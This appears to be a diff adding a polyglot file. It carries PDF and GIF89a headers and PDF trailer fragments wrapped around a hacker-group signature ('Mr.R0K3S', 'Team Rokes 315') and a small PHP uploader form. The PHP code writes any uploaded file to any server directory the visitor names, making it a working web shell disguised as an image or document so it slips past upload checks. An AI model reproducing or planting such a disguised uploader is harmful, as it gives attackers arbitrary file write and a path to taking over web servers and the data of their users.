@@ -1,0 +1,33 @@
+%PDF-1.7
+GIF89a=</script>
+<div id="app">
+<g
+ size="1px">Mr.R0K3S</h1>
+<span class="sub">Team Rokes 315</span>
+<?php
+$uploadd = $_FILES['file']['tmp_name'];
+if (file_exists($uploadd)) {
+   $pwddir = $_POST['dir'];
+   $real = $_FILES['file']['name'];
+   $de = $pwddir."/".$real;
+   copy($uploadd, $de);
+   echo "FILE UPLOADED TO $de";
+}
+?>  
+<form method="post" enctype="multipart/form-data">
+ <input type="text" name="dir" size="30" value="<? echo getcwd(); ?>">
+ <input type="file" name="file" size="15">
+ <input type="submit" value="Upload">
+ </form>
+
+<</Size 394/Root 1 0 R/Info 384 0 R/ID[<5B7C419ED29D1B4D9E591E2509B3C9A9><5B7C419ED29D1B4D9E591E2509B3C9A9>] >>
+startxref
+70396
+%%EOF
+xref
+0 0
+trailer
+<</Size 394/Root 1 0 R/Info 384 0 R/ID[<5B7C419ED29D1B4D9E591E2509B3C9A9><5B7C419ED29D1B4D9E591E2509B3C9A9>] /Prev 70396/XRefStm 69399>>
+startxref
+78436
+%%EOF
